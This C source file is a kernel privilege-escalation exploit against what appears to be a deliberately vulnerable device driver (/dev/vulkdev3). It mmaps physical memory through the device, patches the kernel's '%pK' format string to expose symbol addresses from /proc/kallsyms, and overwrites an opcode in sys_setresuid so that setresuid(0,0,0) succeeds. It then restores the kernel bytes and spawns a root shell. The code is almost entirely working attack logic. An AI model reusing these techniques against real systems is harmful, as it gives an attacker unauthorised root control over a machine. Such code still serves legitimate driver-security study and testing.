#define _GNU_SOURCE
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <fcntl.h>
#include <sys/mman.h>
#include <unistd.h>

#define VULKDEV_DEVICE "/dev/vulkdev3"

/*
based on x86 emulator device:
# cat /proc/iomem
00000000-00000fff : Reserved
00001000-0009fbff : System RAM
0009fc00-0009ffff : Reserved
000a0000-000bffff : PCI Bus 0000:00
  000a0000-000bffff : Video RAM area
000c0000-000c09ff : Video ROM
000f0000-000fffff : Reserved
  000f0000-000fffff : System ROM
00100000-7ffdffff : System RAM
  00200000-009156c3 : Kernel code
  009156c4-00ce9d3f : Kernel data
  00da7000-00e11fff : Kernel bss
7ffe0000-7fffffff : Reserved
*/
#define MMAP_START  0x42424000
#define MMAP_SIZE   0x7ffe0000
#define MMAP_OFFSET 0x00000000

#define KERNEL_ADDR 0xc0000000

unsigned long get_symbol(char *name)
{
	FILE *f;
	unsigned long addr;
	char dummy, sym[512];
	int ret = 0;

	f = fopen("/proc/kallsyms", "r");
	if (!f)
		return 0;
  
	while (ret != EOF) {
		ret = fscanf(f, "%p %c %s\n", (void **) &addr, &dummy, sym);
		if (ret == 0) {
			fscanf(f, "%s\n", sym);
			continue;
		}
		if (!strcmp(name, sym)) {
			printf("[+] resolved symbol %s to %p\n", name, (void *) addr);
			fclose(f);
			return addr;
		}
	}
	fclose(f);
  
	return 0;
}

int kernel_mmap1(int argc, char* argv[])
{
	int fd;
	uid_t uid;
	char *addr;
	unsigned long start;

	fd = open(VULKDEV_DEVICE, O_RDWR);
	if (fd < 0) {
		printf("open vulkdev fail!\n");
		exit(1);
	}

	addr = (char *)mmap((void *)MMAP_START, MMAP_SIZE, PROT_READ|PROT_WRITE, MAP_SHARED, fd, MMAP_OFFSET);
	if (addr == MAP_FAILED) {
		printf("mmap failed, errno = %d\n", errno);
		close(fd);
		return -1;
	}
	start = (unsigned long)addr;
	printf("mmap addr: %lx\n", start);
	uid = getuid();
	printf("uid = %d\n", uid);
	unsigned long sys_setresuid = 0;
	printf("search string \"%%pK %%c %%s\" in memory...\n");
	char *p = (char *)start;
	while ((unsigned long)p < start + MMAP_SIZE - 0x40) {
                unsigned int *p2 = (unsigned int *)p;
		if (*p2 == 0xf9835375 && *(p2+1) == 0x3b1674ff && *(p2+2) == 0x1174104b && *(p2+3) == 0x74204b3b)
			printf("found target opcode, addr=%p\n", p2);
		if (!strcmp(p, "%pK %c %s\n")) {
			printf("found string, addr = %p\n", p);
			printf("patch string...\n");
			p[2] = ' ';
			printf("patch string: %s\n", p);
			sys_setresuid = get_symbol("sys_setresuid");
			break;
		}
		p++;
	}
	if (sys_setresuid) {
		printf("sys_setresuid = 0x%lx\n", sys_setresuid);
		char *p2 = (char *)(sys_setresuid - KERNEL_ADDR + addr);
		char *end = p2 + 0x1000;
		while (p2 < end) {
			if (*((unsigned int *)p2) == 0xf9835375) {
				printf("found target opcode, addr=%p\n", p2);
				printf("patch opcode...\n");
				*((unsigned int *)p2) = 0xf9835374;
				sleep(2);
				setresuid(0, 0, 0);
				*((unsigned int *)p2) = 0xf9835375;
				p[2] = 'K';
				break;
			}
			p2++;
		}
	}
	if (getuid() == 0) {
		printf("GOT ROOT!\n");
		execl("/bin/sh", "sh", NULL);
	}
	return 0;
}

